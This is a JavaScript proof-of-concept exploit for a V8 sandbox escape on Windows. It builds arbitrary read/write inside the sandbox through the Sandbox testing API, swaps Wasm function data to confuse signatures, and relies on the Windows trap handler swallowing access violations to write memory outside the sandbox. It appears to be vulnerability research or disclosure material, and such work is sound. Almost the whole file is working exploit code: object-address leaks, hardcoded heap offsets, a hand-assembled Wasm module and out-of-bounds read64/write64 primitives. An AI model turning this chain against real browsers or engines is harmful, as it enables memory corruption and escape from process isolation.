/**
 * PoC: Windows TryHandleWasmTrap validates PC (ExceptionAddress) but NOT
 *      the accessed memory address (ExceptionInformation[1])
 *
 * File:   src/trap-handler/handler-inside-win.cc:117
 * Root:   ExceptionInformation[1] never checked via IsAccessedMemoryCovered()
 * Ref:    POSIX fix: handler-inside-posix.cc:135-136, commit 33e4006f (CVE-2024-7024)
 *
 * Run (Windows only, requires patched d8 with --sandbox-testing):
 *   d8.exe --sandbox-testing trap_handler_poc.js
 *
 * On POSIX (patched): write64 triggers a crash - AV is NOT swallowed
 * On Windows (unpatched): write64 succeeds - AV IS swallowed - arb R/W outside sandbox
 *
 * Stage 1: in-sandbox arb read/write via Sandbox testing API
 * Stage 2: Wasm function-signature confusion -> OOB Wasm access outside sandbox
 * Stage 3: Windows trap handler swallows the AV (ExceptionInformation[1] unchecked)
 *           -> arbitrary process memory read/write
 */

let hex = (val) => '0x' + val.toString(16);

function gc() {
    for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);
}

function js_heap_defragment() {
    gc();
    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
    for (let i = 0; i < 0x1000; i++) new Uint32Array(1);
}

__buf = new ArrayBuffer(8);
__f64_buf = new Float64Array(__buf);
__u32_buf = new Uint32Array(__buf);

function ftoi(val) {
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) << 32n);
}

function itof(val) {
    __u32_buf[0] = Number(val & 0xffffffffn);
    __u32_buf[1] = Number(val >> 32n);
    return __f64_buf[0];
}

function assert(x) {
    if (!x) { throw new Error("Assertion failed"); }
}

// ---- Stage 1: in-sandbox arb read/write ----------------------------------------
// Sandbox.MemoryView / Sandbox.getAddressOf require --sandbox-testing.
// In a real exploit, these would come from a prior V8 in-sandbox corruption bug.

var u32array = new Uint32Array(4);
var memory = new DataView(new Sandbox.MemoryView(0, 0x100000000n));
var target_page = Sandbox.targetPage;
print("target_page @ " + hex(target_page));

function addrof(obj) {
    return Sandbox.getAddressOf(obj);
}

var arr_addr = addrof(u32array);

// Redirect u32array's data_ptr to sandbox base (offset 0) with huge length
memory.setUint32(arr_addr + 0x30, 0, true);
memory.setUint32(arr_addr + 0x38, 0, true);
memory.setUint32(arr_addr + 0x24, 0xfffffffe, true);
memory.setUint32(arr_addr + 0x2c, 0xfffffffe, true);

function sb_read4(offset) {
    assert(offset % 4 == 0);
    return u32array[offset / 4];
}

function sb_write4(offset, val) {
    assert(offset % 4 == 0);
    u32array[offset / 4] = val;
}

var js_heap_base = BigInt(sb_read4(0x4c)) << 32n;
print("js_heap_base @ " + hex(js_heap_base));

// ---- Stage 2: Wasm signature confusion -> OOB access outside sandbox ------------
//
// Wasm module exports 4 functions + 1 memory:
//   oob_write (i64,i64)->void  : stub (nop)
//   oob_read  (i64)->i64       : stub (i64.const 0)
//   do_write  (i32,i64)->void  : i64.store(local0, local1)
//   do_read   (i32)->i64       : i64.load(local0)
//
// func_copy_impl overwrites oob_read/oob_write's internal function-data index
// to point to do_read/do_write's JIT code.
//
// After the swap:
//   oob_read(i64_addr)         -> executes do_read's machine code with i64 arg
//   oob_write(i64_addr, val)   -> executes do_write's machine code with i64 arg
//
// V8 compiles do_read/do_write with 32-bit Wasm bounds checks (or eliminates them
// entirely in favour of the hardware trap handler). With the i64 offset, the
// effective address (Wasm memory_start + i64_offset) escapes the sandbox.

// Wasm binary:
//   Type section: 4 types (i64,i64)->void, (i64)->i64, (i32,i64)->void, (i32)->i64
//   Func section: 4 functions using those types
//   Memory section: 1 memory (min=0, max=1)
//   Export section: 4 func exports + 1 memory export (FIXED: 0x0d -> 0x0e for 2-export variant below)
//   Code section: stubs for oob_*, real i64 load/store for do_*
var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
    // Type section: 4 types
    0x01, 0x15, 0x04,
        0x60, 0x02, 0x7e, 0x7e, 0x00,  // type 0: (i64,i64)->void  [oob_write]
        0x60, 0x01, 0x7e, 0x01, 0x7e,  // type 1: (i64)->i64        [oob_read]
        0x60, 0x02, 0x7f, 0x7e, 0x00,  // type 2: (i32,i64)->void  [do_write]
        0x60, 0x01, 0x7f, 0x01, 0x7e,  // type 3: (i32)->i64        [do_read]
    // Function section: 4 funcs
    0x03, 0x05, 0x04, 0x00, 0x01, 0x02, 0x03,
    // Memory section: min=0, max=1
    0x05, 0x03, 0x01, 0x00, 0x01,
    // Export section: 4 func exports
    0x07, 0x2d, 0x04,
        0x09, 0x6f, 0x6f, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x00, // "oob_write" func 0
        0x08, 0x6f, 0x6f, 0x62, 0x5f, 0x72, 0x65, 0x61, 0x64, 0x00, 0x01,       // "oob_read"  func 1
        0x08, 0x64, 0x6f, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02,       // "do_write"  func 2
        0x07, 0x64, 0x6f, 0x5f, 0x72, 0x65, 0x61, 0x64, 0x00, 0x03,             // "do_read"   func 3
    // Code section: 4 function bodies
    0x0a, 0x1c, 0x04,
        0x03, 0x00, 0x01, 0x0b,              // oob_write: nop
        0x04, 0x00, 0x42, 0x00, 0x0b,        // oob_read:  i64.const 0
        0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0b, // do_write: i64.store(l0,l1)
        0x07, 0x00, 0x20, 0x00, 0x29, 0x03, 0x00, 0x0b              // do_read:  i64.load(l0)
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { oob_read, oob_write, do_read, do_write } = wasm_instance.exports;

// Warm up JIT
oob_read(0n);
oob_write(0n, 0n);
do_read(0);
do_write(0, 0n);

function get_func_ref(func) {
    var func_addr = addrof(func);
    var shared_info_addr = sb_read4(func_addr + 0x10) - 1;
    var function_data_addr = sb_read4(shared_info_addr + 0x8) - 1;
    var func_ref = sb_read4(function_data_addr + 0x8) - 1;
    return func_ref;
}

// Copy do_read's function-data index into oob_read (and do_write into oob_write)
// so they execute the i32 load/store machine code but are called with i64 ABI
function func_copy_impl(dst, src) {
    var src_func_ref = get_func_ref(src);
    var dst_func_ref = get_func_ref(dst);
    var idx = sb_read4(src_func_ref + 0x4);
    sb_write4(dst_func_ref + 0x4, idx);
}

func_copy_impl(oob_read, do_read);
func_copy_impl(oob_write, do_write);

// ---- Stage 3: Trigger Windows trap handler AV swallow -------------------------
//
// Wasm memory_start is at js_heap_base + 0x380000000 in release builds.
// NOTE: This offset is build-dependent.
//
// POSIX (patched):   SIGSEGV forwarded -> crash -> "escape blocked"
// Windows (unpatched): AV swallowed -> oob_write returns -> "SANDBOX ESCAPE CONFIRMED"

function read64(addr) {
    var offset = addr - (js_heap_base + 0x380000000n);
    return oob_read(offset);
}

function write64(addr, val) {
    oob_write(addr - (js_heap_base + 0x380000000n), val);
}

// ---- Trigger -------------------------------------------------------------------
print("[*] Attempting out-of-sandbox write to target_page @ " + hex(target_page));
print("[*] On Windows (unpatched): succeeds silently");
print("[*] On POSIX   (patched):   crashes (expected)");

write64(BigInt(target_page), 0x4242424242424242n);

print("[+] SANDBOX ESCAPE CONFIRMED: write64 returned without exception");
print("[+] target_page written with 0x4242424242424242 outside V8 sandbox");
